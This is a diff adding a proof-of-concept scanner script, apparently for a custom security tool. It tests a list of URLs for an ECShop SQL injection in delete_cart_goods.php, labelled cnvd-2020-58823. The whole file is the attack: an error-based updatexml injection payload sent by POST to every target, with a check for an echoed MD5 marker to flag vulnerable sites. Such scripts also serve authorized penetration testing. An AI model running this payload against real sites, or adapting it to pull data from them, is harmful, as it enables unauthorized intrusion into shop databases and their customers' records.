@@ -1,0 +1,24 @@
+#request urls = array
+#define payload = /delete_cart_goods.php
+#define bug = ef775988943825d2871e1cfa75473ec
+#define info = ecshop-cnvd-2020-58823-sqli
+#define post = id=0||(updatexml(1,concat(0x7e,(select%20md5(99999999)),0x7e),1))
+
+function main(args)
+{
+	printclolor("当前正在检测:".info,1);
+	i = 0;
+	num = GetArrayNum(urls);
+	while(i<num){
+		url = urls[i];
+		try{
+			res = HttpPost(url.payload,post,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+			if(StrFindStr(res[0],bug,0)!= "-1")
+			{
+				printclolor("[+]".urls[i].info,3);
+			}
+		}catch{
+		}
+		i = ToInt(i+1);
+	}
+}
